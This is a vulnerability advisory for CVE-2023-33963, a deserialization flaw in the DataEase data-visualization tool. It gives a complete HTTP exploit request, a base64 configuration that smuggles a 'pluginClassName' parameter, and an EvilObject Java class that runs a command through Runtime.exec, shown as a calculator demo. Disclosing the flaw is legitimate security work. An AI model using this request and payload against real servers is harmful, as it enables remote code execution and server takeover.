# CVE-2023-33963

>   DataEase是开源的数据可视化分析工具，帮助用户快速分析数据并洞察业务趋势，从而实现业务的改进与优化。

## 来源

[https://github.com/dataease/dataease/security/advisories/GHSA-m26j-gh4m-xh9f](https://github.com/dataease/dataease/security/advisories/GHSA-m26j-gh4m-xh9f)

## 漏洞类型

反序列化

## 漏洞描述

DataEase在1.18.7版本之前存在反序列化漏洞，攻击者利用该漏洞来执行任意命令，写入后门，从而入侵服务器，获取服务器权限，直接导致服务器沦陷。

## 影响范围

-   DataEase <= 1.18.6

## 漏洞详情

>   A deserialization vulnerability exists in the DataEase datasource, which can be exploited to execute arbitrary code.

1.  Using the data source verification interface to deliver malicious code:

    ```http
    POST /datasource/validate/ HTTP/1.1 
    Host: xxxxxxxxxxx 
    Content-Length: 708 
    Accept: application/json, text/plain, */* 
    LINK-PWD-TOKEN: null 
    Accept-Language: zh-CN 
    Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODQyNTI5NDksInVzZXJJZCI6M SwidXNlcm5hbWUiOiJhZG1pbiJ9.o_TJpQ6dwRqYk1SOOE2c8MyatbF-xm2z7ot0hLDXu3E 
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 
    Content-Type: application/json 
    Origin: http://121.36.208.130 
    Referer: http://121.36.208.130/ 
    Accept-Encoding: gzip, deflate 
    Cookie: request-time-out=100; sysUiInfo=...; language=zh_CN; Authorization=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODQyNTI5NDk sInVzZXJJZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.o_TJpQ6dwRqYk1SOOE2c8MyatbF�xm2z7ot0hLDXu3E 
    Connection: close
    
    {"configuration":"eyJpbml0aWFsUG9vbFNpemUiOjUsImV4dHJhUGFyYW1zIjoiIiwibWluUG9vbFNpemUiOjUsIm1heFBvb2xTaXplIjo1MCwibWF4SWRsZVRpbWUiOjMwLCJhY3F1aXJlSW5jcmVtZW50Ijo1LCJpZGxlQ29ubmVjdGlvblRlc3RQZXJpb2QiOjUsImNvbm5lY3RUaW1lb3V0Ijo1LCJjdXN0b21Ecml2ZXIiOiJkZWZhdWx0IiwicXVlcnlUaW1lb3V0IjozMCwiaG9zdCI6IjEyNy4wLjAuMSIsImRhdGFCYXNlIjoidGVzdGRiIiwidXNlcm5hbWUiOiJyb290IiwicGFzc3dvcmQiOiJNeXNRbFRlc3QiLCJwb3J0IjoiNTAwMSJ9","apiConfiguration":[],"type":"mysql","name":"testdb","configurationEncryption":true}
    ```

base64 decode content:

```json
{"initialPoolSize":5,"extraParams":"","minPoolSize":5,"maxPoolSize":50,"maxIdleTime":30,"acquireIncrement":5,"idleConnectionTestPeriod":5,"connectTimeout":5,"customDriver":"default","queryTimeout":30,"host":"127.0.0.1","dataBase":"testdb","username":"root","password":"MysQlTest","port":"5001"}
```



Because the dataBase parameter is controllable, you can add a malicious parameter, pluginClassName, which will implement the instantiates a class.

The original data can be modified to include new malicious parameters.

base64 decode content:

```json
{ "initialPoolSize":5, "extraParams":"pluginClassName=com.example.demo.EvilObject", "minPoolSize":5, "maxPoolSize":50, "maxIdleTime":30, "acquireIncrement":5, "idleConnectionTestPeriod":5, "connectTimeout":5, "customDriver":"default", "queryTimeout":30, "host":"127.0.0.1", "dataBase":"testdb", "username":"root", "password":"MysQlTest", "port":"5001" }
```

base64 encode data:

```json
{"configuration":"eyJpbml0aWFsUG9vbFNpemUiOjUsImV4dHJhUGFyYW1zIjoicGx1Z2luQ2xhc3NOYW1lPWNvbS5leGFtcGxlLmRlbW8uRXZpbE9iamVjdCIsIm1pblBvb2xTaXplIjo1LCJtYXhQb29sU2l6ZSI6NTAsIm1heElkbGVUaW1lIjozMCwiYWNxdWlyZUluY3JlbWVudCI6NSwiaWRsZUNvbm5lY3Rpb25UZXN0UGVyaW9kIjo1LCJjb25uZWN0VGltZW91dCI6NSwiY3VzdG9tRHJpdmVyIjoiZGVmYXVsdCIsInF1ZXJ5VGltZW91dCI6MzAsImhvc3QiOiIxMjcuMC4wLjEiLCJkYXRhQmFzZSI6InRlc3RkYiIsInVzZXJuYW1lIjoicm9vdCIsInBhc3N3b3JkIjoiTXlzUWxUZXN0IiwicG9ydCI6IjUwMDEifQ==","apiConfiguration":[],"type":"mysql","name":"testdb","configurationEncryption":true}
```

The implementation code of EvilObject class is as follows

```
package com.example.demo;
import java.io.IOException;

public class EvilObject {
  public EvilObject() {
    try {
      Runtime.getRuntime().exec("open -a Calculator");
    } catch (IOException e) {
      throw new RuntimeException(e);
    }
  }
}
```

The test code is as follows
[![image](https://user-images.githubusercontent.com/985347/241656114-f8476980-52b7-4d1e-ae12-a66b64f19d25.png)](https://user-images.githubusercontent.com/985347/241656114-f8476980-52b7-4d1e-ae12-a66b64f19d25.png)